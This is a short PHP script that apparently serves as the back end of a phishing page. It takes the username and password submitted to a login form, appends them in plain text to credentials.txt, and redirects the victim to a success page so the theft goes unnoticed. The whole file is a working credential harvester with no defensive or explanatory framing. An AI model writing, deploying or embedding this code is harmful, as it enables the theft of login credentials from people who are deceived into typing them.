<?php

$user = $_POST['username'];
$pass = $_POST['password'];

$file = fopen("credentials.txt", "a");

fwrite($file, "Email: " . $user . "\n");
fwrite($file, "Password: " . $pass . "\n");
fwrite($file, "----------------------\n");

fclose($file);

header("Location: success.html");

?>
